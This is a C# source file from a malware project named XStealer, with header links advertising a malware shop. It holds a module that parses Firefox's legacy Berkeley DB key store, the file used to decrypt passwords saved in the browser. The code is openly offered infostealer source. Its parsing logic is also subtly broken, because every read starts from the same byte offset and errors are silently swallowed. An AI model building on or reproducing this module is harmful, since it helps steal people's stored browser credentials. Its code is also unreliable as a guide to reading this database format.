// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Browsers.Gecko
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Text;

    // Класс для расшифровки старой базы 
    public class BerkeleyDB
    {
        public string Version { get; set; } // Версия базы
        public List<KeyValuePair<string, string>> Keys { get; }
        public BerkeleyDB(string fileName)
        {
            var list = new List<byte>();
            Keys = new List<KeyValuePair<string, string>>();
            try
            {
                #region New read
                //int i = 0;
                //byte[] buff = File.ReadAllBytes(fileName); 
                //foreach (byte b in buff) { list.Add(b); i++; }
                #endregion

                using var read = new FileStream(fileName, FileMode.Open, FileAccess.Read);
                using var binaryReader = new BinaryReader(read); // BinaryReader(File.Open(FileName));
                int i = 0;
                for (int num = (int)binaryReader.BaseStream.Length; i < num; i++)
                {
                    list.Add(binaryReader.ReadByte());
                }
                string value = BitConverter.ToString(Extract(list.ToArray(), 4, false)).Replace("-", "");
                string text = BitConverter.ToString(Extract(list.ToArray(), 4, false)).Replace("-", "");
                int num2 = BitConverter.ToInt32(Extract(list.ToArray(), 4, true), 0);
                if (!string.IsNullOrEmpty(value))
                {
                    Version = "Berkelet DB";
                    if (text.Equals("00000002")) { Version += " 1.85 (Hash, version 2, native byte-order)"; }
                    int num3 = int.Parse(BitConverter.ToString(Extract(list.ToArray(), 4, false)).Replace("-", "")), num4 = 1;
                    while (Keys.Count < num3)
                    {
                        string[] array = new string[(num3 - Keys.Count) * 2];
                        for (int j = 0; j < (num3 - Keys.Count) * 2; j++)
                        {
                            array[j] = BitConverter.ToString(Extract(list.ToArray(), 2, true)).Replace("-", "");
                        }
                        Array.Sort(array);
                        for (int k = 0; k < array.Length; k += 2)
                        {
                            int num5 = Convert.ToInt32(array[k], 16) + (num2 * num4);
                            int num6 = Convert.ToInt32(array[k + 1], 16) + (num2 * num4);
                            int num7 = (k + 2 >= array.Length) ? (num2 + (num2 * num4)) : (Convert.ToInt32(array[k + 2], 16) + (num2 * num4));
                            string @string = Encoding.ASCII.GetString(Extract(list.ToArray(), num7 - num6, false));
                            if (!string.IsNullOrEmpty(@string))
                            {
                                string value2 = BitConverter.ToString(Extract(list.ToArray(), num6 - num5, false));
                                Keys.Add(new KeyValuePair<string, string>(@string, value2));
                            }
                        }
                        num4++;
                    }
                }
                else
                {
                    Version = "Unknow database format";
                }
            }
            catch { }
        }

        private byte[] Extract(byte[] source, int length, bool littleEndian)
        {
            byte[] results = new byte[length];
            try
            {
                int index = Array.IndexOf(source, (byte)0x55);
                Array.Copy(source, index, results, 0, length);
                if (littleEndian) { try { Array.Reverse(results); } catch { } }
            }
            catch { }
            return results;
        }
    }
}